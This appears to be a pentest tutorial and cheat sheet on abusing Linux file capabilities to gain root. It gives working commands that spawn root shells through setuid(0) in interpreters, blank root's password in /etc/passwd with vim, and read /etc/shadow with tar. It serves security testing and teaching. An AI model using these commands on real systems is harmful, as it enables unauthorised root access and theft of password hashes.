---
title: 'Capabilities Abuse'
description: 'Linux privilege escalation via capabilities — enumeration, capability flags, and exploiting cap_setuid, cap_dac_override, and cap_sys_admin.'
---

# Capabilities Abuse

Linux capabilities split the privileges of the root user into distinct units. Instead of granting a binary full SUID root access, an administrator can grant it just the specific capability it needs (e.g., binding to a low port). However, many capabilities are so powerful that they are functionally equivalent to root access.

---

## Quick Reference — Dangerous Capabilities

| Capability | Risk | Exploitation Path |
|:-----------|:-----|:------------------|
| `cap_setuid` | UID manipulation | Escalate to root UID (0) via language interpreters (Python/Perl) |
| `cap_setgid` | GID manipulation | Escalate to root GID (0) |
| `cap_dac_override` | Bypass permissions | Read/write *any* file on the system (e.g., `/etc/shadow`) |
| `cap_dac_read_search`| Bypass read permissions| Read *any* file on the system |
| `cap_sys_admin` | Admin privileges | Mount filesystems, manage namespaces (nearly full root) |
| `cap_sys_ptrace` | Process tracing | Inject shellcode into root-owned processes |
| `cap_sys_module` | Kernel modules | Load malicious kernel modules |
| `cap_net_raw` | Raw sockets | Sniff network traffic (e.g., tcpdump) |

### Capability Flags (`+ep`, `+ei`)

When looking at `getcap` output (e.g., `=ep`), the letters denote the flag:

* **e (Effective)**: The capability is "active".
* **p (Permitted)**: The capability is allowed to be used.
* **i (Inheritable)**: Child processes spawned by the binary inherit the capability.

!!! tip "Exploitability"
    For privilege escalation, you generally need the capability to be **Effective** and **Permitted** (`+ep` or `=ep`).

---

## 1. Enumeration

```bash
# Find all binaries with capabilities set across the whole filesystem
getcap -r / 2>/dev/null

# Alternative using find (useful if getcap -r is restricted/unavailable)
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
```

---

## 2. Exploitation: `cap_setuid`

If a binary has `cap_setuid`, it can change its own UID. If that binary allows executing system commands (like a programming language), you can change your UID to 0 (root) and spawn a shell.

### Python

```bash
# If python has cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Perl

```bash
# If perl has cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### PHP

```bash
# If php has cap_setuid
php -r 'posix_setuid(0); system("/bin/bash");'
```

### Ruby

```bash
# If ruby has cap_setuid
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

---

## 3. Exploitation: `cap_dac_override`

`cap_dac_override` ignores all read, write, and execute permissions. If a text editor or file utility has this capability, you can modify critical system files.

### Vim / Nano

If `vim` or `nano` has `cap_dac_override`, you can directly edit `/etc/passwd`.

```bash
# 1. Open /etc/passwd
/usr/bin/vim.basic /etc/passwd

# 2. Remove the 'x' from the root user line
# Change: root:x:0:0:root:/root:/bin/bash
# To:     root::0:0:root:/root:/bin/bash

# 3. Save and switch to root (no password required)
su root
```

**Non-Interactive Vim Exploitation:**

```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
su root
```

### Tar / Zip

If an archiving tool has `cap_dac_override`, you can read sensitive files by archiving them, then extracting them to a location you own.

```bash
# Example: reading /etc/shadow with tar
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

---

## 4. Exploitation: `cap_sys_admin` & Others

`cap_sys_admin` is heavily overloaded and essentially grants root access. One common vector is mounting filesystems.

!!! tip "GTFOBins is your friend"
    For capabilities like `cap_sys_admin`, `cap_sys_ptrace`, or even `cap_dac_override`, the exploitation path depends entirely on the binary itself. Always check the **+capabilities** tab on [GTFOBins](https://gtfobins.github.io/#+capabilities) for the specific binary you found.

---

## Cheatsheet — Capabilities in 30 Seconds

```bash
# 1. Enumerate capabilities
getcap -r / 2>/dev/null

# 2. Exploit cap_setuid (Language interpreters)
python -c 'import os;os.setuid(0);os.system("bash")'

# 3. Exploit cap_dac_override (Editors/Archivers)
vim /etc/passwd    # Remove 'x' from root, then run: su root
tar -cvf shadow.tar /etc/shadow && tar -xvf shadow.tar
```